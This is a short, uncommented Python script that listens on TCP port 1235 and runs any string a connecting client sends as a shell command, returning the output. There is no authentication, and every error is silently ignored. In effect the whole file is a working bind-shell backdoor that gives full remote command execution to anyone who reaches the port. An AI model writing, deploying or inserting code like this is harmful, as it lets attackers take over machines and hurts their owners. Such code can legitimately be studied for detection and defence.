import socket
import sys
import struct
import os
import threading

PORT = 1235
clients = []

def worker(client):
    while True:
        try:
            string = client.recv(1024).decode()
            stream = os.popen(string)
            client.send(stream.read().encode())
        except:
            pass

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', PORT))
    s.listen(5)
except socket.error as err:
    print(err.strerror)
    exit(-1)

while True:
    client, addr = s.accept()
    if client not in clients:
        clients.append(client)
    t = threading.Thread(target = worker, args= (client,))
    t.start()